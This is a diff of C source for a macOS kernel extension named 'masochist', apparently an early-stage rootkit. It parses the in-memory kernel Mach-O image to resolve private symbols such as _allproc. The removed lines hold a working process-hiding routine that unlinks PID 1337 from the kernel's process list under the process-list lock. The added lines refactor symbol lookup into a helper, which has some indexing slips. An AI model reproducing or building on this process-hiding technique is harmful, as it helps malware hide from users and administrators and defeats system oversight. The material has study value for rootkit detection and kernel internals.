@@ -19,113 +19,105 @@ kern_return_t masochist_stop(kmod_info_t *ki, void *d);
 
 #define KERNEL_BASE (0xffffff8000200000 + 0x8000000) // use kas_info
 
-kern_return_t masochist_start(kmod_info_t * ki, void *d)
-{
-    /* XXX: Replace printf's with a debug logger. This way, we can turn off
-     *      these printf's by utilizing #define DEBUG
-     */
-    
-    struct mach_header_64 *kernel_header = (struct mach_header_64 *)KERNEL_BASE;
-    
-    printf("INCOMING KERNEL MACH-O HEADER.\n");
-    printf("Magic: 0x%x\n", kernel_header->magic);
-    printf("CPU type: 0x%x\n", kernel_header->cputype);
-    printf("CPU subtype: 0x%x\n", kernel_header->cpusubtype);
-    printf("Filetype: 0x%x\n", kernel_header->filetype);
-    printf("ncmds: 0x%x\n", kernel_header->ncmds);
-    printf("sizeofcmds: 0x%x\n", kernel_header->sizeofcmds);
-    printf("flags: 0x%x\n", kernel_header->flags);
-    printf("reserved: 0x%x\n", kernel_header->reserved);
-    printf("=========================== PARSING LOAD COMMANDS ===========================\n");
+void *
+find_symbol(const char *symbol, struct mach_header_64 *header) {
     
     struct load_command *lc = NULL;
     struct segment_command_64 *seg = NULL;
     struct segment_command_64 *linkedit = NULL;
     
-    /* First load command starts right after the header */
+    /* Lets get the first load command */
     
     lc = (struct load_command *)(sizeof(struct mach_header_64) + KERNEL_BASE);
     
+    /* iterate through all of the load commands until we find __LINKEDIT */
     int i;
-    for(i = 0; i < kernel_header->ncmds; i++) {
+    for(i = 0; i < header->ncmds; i++) {
+        
         if(lc->cmd == LC_SEGMENT_64) {
+            
             seg = (struct segment_command_64 *)lc;
+            
             if(strcmp(seg->segname, "__LINKEDIT") == 0) {
+                
+                /* we found it */
                 linkedit = (struct segment_command_64 *)lc;
-                printf("Found __LINKEDIT!\n");
                 break;
+                
             }
         }
+        
+        /* next load command please */
         lc = (struct load_command *)((uint64_t)lc + (uint64_t)lc->cmdsize);
     }
     
     if(linkedit == NULL) {
+        
+        /* We didn't find it */
         printf("__LINKEDIT doesn't exit.\n");
-        return KERN_FAILURE;
+        return 0;
+        
     }
     
-    printf("=========================== LOCATING SYMBOL TABLES ===========================\n");
+    /* iterate through load commands again and look for LC_SYMTAB */
     
     struct symtab_command *lc_symtab;
-    for(i = 0; i < kernel_header->ncmds; i++) {
+    for(i = 0; i < header->ncmds; i++) {
+        
         if(lc->cmd == LC_SYMTAB) {
+            
             lc_symtab = (struct symtab_command *)lc;
             lc = (struct load_command *)(sizeof(struct mach_header_64) + KERNEL_BASE);
-            printf("Found LC_SYMTAB!\n");
             break;
+            
         }
+        
         lc = (struct load_command *)((uint64_t)lc + (uint64_t)lc->cmdsize);
+        
     }
+    
+    /* Calculate the address to the symbol table and the string table */
     
     uint64_t symbolTable = (linkedit->vmaddr + (lc_symtab->symoff) - linkedit->fileoff);
     uint64_t stringTable = (linkedit->vmaddr + (lc_symtab->stroff - linkedit->fileoff));
     
-    printf("Symbol table @ 0x%llx\n", symbolTable);
-    printf("String table @ 0x%llx\n", stringTable);
-    
-    printf("=========================== SEARCHING FOR SYMBOLS ===========================\n");
-    
-    struct proclist *procList = NULL;
-    struct proc *process = NULL;
-    
     struct nlist_64 *nlist = (struct nlist_64 *)symbolTable;
-    void (*proc_list_lock)() = NULL;
-    void (*proc_list_unlock)() = NULL;
     
-    /* XXX: Put symbol finding in its own function*/
+    /* Iterate through the symbol table until we find what we're lookig for */
     
     for(i = 0; i < lc_symtab->nsyms; i++) {
-        if(!strcmp("_allproc", (char *)(nlist->n_un.n_strx + stringTable))) {
-            printf("Found `_allproc'.\n");
-            procList = (struct proclist *)(nlist->n_value);
-        } else if(!strcmp("_proc_list_lock", (char *)(nlist->n_un.n_strx + stringTable))) {
-            printf("Found `_proc_list_lock'.\n");
-            proc_list_lock = (void *)(nlist->n_value);
-        } else if(!strcmp("_proc_list_unlock", (char *)(nlist->n_un.n_strx + stringTable))) {
-            printf("Found `_proc_list_unlock'.\n");
-            proc_list_unlock = (void *)(nlist->n_value);
+        
+        if(!strcmp(symbol, (char *)(nlist->n_un.n_strx + stringTable))) {
+            
+            /* Found it! Return a pointer to the symbol */
+            return (struct proclist *)(nlist->n_value);
+            
         }
         
+        /* next nlist please */
         nlist = (struct nlist_64 *)(symbolTable + (i * sizeof(struct nlist_64)));
     }
     
-    printf("=========================== HIDING PROCESS ===========================\n");
-    for (process = procList->lh_first; process != 0; process = process->p_list.le_next) {
-        
-        if(process->p_pid == 1337) {
-            proc_list_lock();
-            LIST_REMOVE(process, p_list);
-            proc_list_unlock();
-        }
-        
-    }
+    /* FAILURE */
+    return 0;
     
-    printf("Done.\n");
+}
+
+kern_return_t
+masochist_start(kmod_info_t * ki, void *d) {
+    
+    /* Get the mach header of the kernel */
+    struct mach_header_64 *kernel_header = (struct mach_header_64 *)KERNEL_BASE;
+    
+    /* Lets find some symbols */
+    struct proclist *allproc = find_symbol("_allproc", kernel_header);
+    printf("_allproc = 0x%p\n", allproc);
     
     return KERN_SUCCESS;
 }
 
-kern_return_t masochist_stop(kmod_info_t *ki, void *d)
+kern_return_t
+masochist_stop(kmod_info_t *ki, void *d)
 {
     return KERN_SUCCESS;
 }
